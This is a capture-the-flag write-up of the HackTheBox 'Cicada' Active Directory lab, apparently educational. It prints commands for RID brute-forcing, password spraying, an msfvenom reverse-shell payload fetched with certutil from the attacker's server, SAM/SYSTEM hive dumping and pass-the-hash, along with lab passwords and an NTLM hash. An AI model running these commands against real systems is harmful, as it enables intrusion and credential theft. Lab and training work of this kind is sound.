## Hello everyone!

Welcome to another CTF.

Today, we will cover “Cicada”, an easy-level machine created by HackTheBox

Without further ado, let’s get started!



![image](/HTB/Cicada/Cicada_images/1.png)



(ensure that you have added the following line `TARGET_IP     cicada.htb` to your local `/etc/hosts` file)

## Information Gathering

We will start with an aggressive **Nmap** scan to gather as much information as possible:



![image](/HTB/Cicada/Cicada_images/2.png)



We can identify a couple of services. The fundamentals here are:

**DNS** (53)

**Kerberos** (88)

**RPC** (135)

**NetBIOS** (139)

**LDAP** (389)

**SMB** (445)

**Kerberos_passwd** (464)

**WinRM** (5985)

Moreover, we can identify the target’s hostname `CICADA-DC`, which is hosted on an AD domain: `cicada.htb`.

At this point, we can assume that we’re facing an Active Directory environment.

Let’s enumerate available **SMB shares** using `smbclient`:



![image](/HTB/Cicada/Cicada_images/3.png)



We can identify seven shares. After trying access each of them, we can see that the `HR` share, which seems to be associated with a human ressources share, can be accessed and listed via anonymous access:



![image](/HTB/Cicada/Cicada_images/4.png)



There is a “`Notice from HR.txt`” file which can potentially contain useful information. We can read the file using `more`:



![image](/HTB/Cicada/Cicada_images/5.png)



The file greets new employees with instructions about how to change their default password. As mentioned, new user accounts obtain the following password by default:

`Cicada$M6Corpb*@Lp#nZp!8`

## Initial Access

We could gain an initial access if we were able to find a valid user account which still has this default password.

We can use **NetExec** to enumerate users on the system via **RID brute force** using the following command:

`nxc smb cicada.htb -u Guest -p '' --rid-brute`



![image](/HTB/Cicada/Cicada_images/6.png)



We can identify multiple users. We will paste them into a `users.txt` file:



![image](/HTB/Cicada/Cicada_images/7.png)



Now that we have enumerated valid user accounts, we can perform a **password spraying attack**. Unlike a brute-force attack, which consists of trying as many passwords as possible against a single account, **password spraying** consists of testing a single password against multiple accounts. Since we discovered a default password which need to be changed, we can try to perform this type of attack in order to see if a user forgot to change the default password. We will run the following command through NetExec to perform this:

`nxc smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'`



![image](/HTB/Cicada/Cicada_images/8.png)



The password spraying attack was successful! We can learn that the user account **michael.wrightson** didn’t change the default password.

Since we were restricted to RID brute-force as Guest, we can now enumerate the users and information related to them using NetExec again, but with the valid credentials we found for the user **michael.wrightson**:



![image](/HTB/Cicada/Cicada_images/9.png)



We can see that the user **david.orelious** dangerously stored his password in his account description. So we found another account with valid credentials: `david.orelious : aRt$Lp#7t*VQ!3`.

Getting back to SMB shares, it seems that we can now list the DEV share content as **david.orelious**:



![image](/HTB/Cicada/Cicada_images/10.png)



The share hosts a `Backup_script.ps1` Powershell script. We can download it via `get` and use the `strings` command to inspect the script:



![image](/HTB/Cicada/Cicada_images/11.png)



And it seems that we once again discovered valid credentials for a user account on the domain: `emily.oscars : Q!3@Lp#M6b*7t*Vt`

It seems that we can now access the ADMIN$ protected share:



![image](/HTB/Cicada/Cicada_images/12.png)



Since WinRM is enabled on the target and we got access to an elevated user, we can try to use `evil-winrm` to obtain remote access to the target system as **emily.oscars**:



![image](/HTB/Cicada/Cicada_images/13.png)



It works! We can now navigate to the file system and retrieve the user flag:



![image](/HTB/Cicada/Cicada_images/14.png)



## Privilege Escalation

Now, we need to elevate our access to the **Administrator** user account in order to retrieve the last flag. We can start by enumerating our current privileges:



![image](/HTB/Cicada/Cicada_images/15.png)



We can identify a very interesting enabled privileges: **SeBackupPrivilege** and **SeRestorePrivilege**.

These privileges allow us to retrieve SYSTEM and SAM hives, critical files which store NTLM hashes.

We can run the following commands to backup the files on our accessible Desktop:  

`reg save hklm\sam C:\Users\emily.oscars.CICADA\Desktop\sam.hive
reg save hklm\system C:\Users\emily.oscars.CICADA\Desktop\system.hive`



![image](/HTB/Cicada/Cicada_images/16.png)



We now need to transfer an `msfvenom` payload to the target in order to download the `.hive` file. Let’s generate our payload with the following command:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LOCAL_IP LPORT=NC_PORT -f exe > malicious.exe`



![image](/HTB/Cicada/Cicada_images/17.png)



We will transfer it via a **python3 server** that we will set up with the following command:

`python3 -m http.server 8000`

 

Getting back to the target, we will run the following command to download the payload:

`certutil -urlcache -f http://LOCAL_IP:8000/revshell.exe revshell.exe`



![image](/HTB/Cicada/Cicada_images/18.png)



We will then set up a **multi/handler listener** via Metasploit in order to get a Meterpreter session and download the `.hive` files. Once we have configured the multi/handler listener, we will run it and execute the payload on our target:

![image](/HTB/Cicada/Cicada_images/19.png)

Once executed, you will obtain a **Meterpreter** session as above. We can now download the `.hive` files through the `download` built-in Meterpreter command running simply `download sam.hive` and `download system.hive`

Once we have done that, we can now use `impacket-secretsdump` to extract the hashes from `.hive` files with the following command:

`impacket-secretsdump -sam sam.hive -system system.hive LOCAL`



![image](/HTB/Cicada/Cicada_images/21.png)



And we successfully extracted the Administrator’s NTLM hash! We can now use `evil-winrm` again to perform a Pass-the-Hash attack in order to get access as Administrator. This can be achieved with the following command:

`evil-winrm -i cicada.htb -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341`

(Note that we didn’t provide the LM hash)



![image](/HTB/Cicada/Cicada_images/22.png)



We successfully elevated our privileges! We now have full access on the system since we are logged in as Administrator, which has full privileges. This can be verified by running `whoami /priv`:



![image](/HTB/Cicada/Cicada_images/23.png)



We can now navigate to the `C:\Users\Administrator\Desktop` directory and retrieve the `root.txt` flag:



![image](/HTB/Cicada/Cicada_images/24.png)



With that, we can assume complete compromise of the target system!



![image](/HTB/Cicada/Cicada_images/25.png)



## Conclusion

This machine was a great introduction to common Active Directory misconfigurations and post-exploitation techniques. Throughout this challenge, we chained together several small weaknesses that ultimately led to a complete compromise of the domain controller.

We first leveraged anonymous SMB access to retrieve sensitive information from an HR share, which exposed a default password format used for newly created accounts. By combining this information with RID brute-forcing and a password spraying attack, we successfully obtained valid domain credentials. From there, poor operational security practices — such as storing passwords in account descriptions and backup scripts — allowed us to progressively move laterally across the environment until we gained remote access through WinRM.

For the privilege escalation phase, the machine highlighted the risks associated with dangerous Windows privileges such as **SeBackupPrivilege** and **SeRestorePrivilege**. By abusing these privileges, we were able to extract the SAM and SYSTEM hives, recover NTLM hashes, and finally perform a Pass-the-Hash attack to obtain full Administrator access.

Overall, *Cicada* was an excellent beginner-friendly Active Directory machine that demonstrated how seemingly minor security oversights can quickly escalate into a full domain compromise when combined.

**Thank you for reading!**
